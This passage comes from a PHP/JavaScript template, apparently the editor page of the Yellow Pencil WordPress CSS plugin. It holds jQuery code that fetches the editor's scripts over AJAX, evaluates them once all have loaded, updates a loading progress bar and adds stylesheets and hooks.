		            <?php if(isset($_GET["yp_load_popup"])){ ?>
		            auto_load_popup();
		            $("#yp-customizing-type-frame").on("load", function(){
            			body.addClass("yp-yellow-pencil yellow-pencil-ready");
		            	$(".yp-iframe-loader").hide();
		            	 window.leftBarSize = $(".editor-leftbar").get(0).getBoundingClientRect();
		            });
		            <?php }else{ ?>
            		setTimeout(function(){
            			body.addClass("yp-yellow-pencil yellow-pencil-ready");
		            	$(".yp-iframe-loader").hide();
		            	 window.leftBarSize = $(".editor-leftbar").get(0).getBoundingClientRect();
		        	}, 70);
		        	<?php } ?>

		        }

				$.each(scripts, function (index, value) {

					$.ajax({

					    url      : scripts[index],

					    //force the dataType to be "text" rather than "script"
					    dataType : 'text',

					    success  : function (textScript) {

					    	yp_load_note("Loading Scripts", 60+parseInt(38*Object.keys(responses).length/(scripts.length - 1)));

					        //add the response to the "responses" object
					        responses[value] = textScript;

					        //check if the "responses" object has the same length as the "scripts" array,
					        //if so then evaluate the scripts
					        if (Object.keys(responses).length === scripts.length) {
					            yp_eval_scripts();
					        }

					    },

					    error : function (jqXHR, textStatus, errorThrown){
					    	var err = errorThrown.toLowerCase();
					    	if(err == "not found"){err = "scripts not found"}
					        alert(jsUcfirst(err) + ".");
					    }

					});

				}); // frame ready

			}); // Document ready.

		});

	// UppercaseFirst
	function jsUcfirst(string){
	    return string.charAt(0).toUpperCase() + string.slice(1);
	}

	// CSS Loader
	function yp_load_css(link){
		$('<link>').appendTo('head').attr({type: 'text/css',rel: 'stylesheet',href: link});
	}

	// Update loading notes.
	var oldP = 0;
	function yp_load_note(text, p){
		if(window.loadStatus == false && oldP < p){
			if(text){
				$(".loading-files").html(text);
			}
			$("#loader i").css("width", p + "%");
			oldP = p;
		}
	}

	// Javascript hook for call in editor
	window.yp_js_hook = function() {
		<?php yp_js_hook(); ?>
	};

	})(jQuery);
	</script>

	<?php yp_editor_styles($id, $type, $mode, "all"); ?>
	<?php yp_editor_footer(); ?>
	</body>
</html>
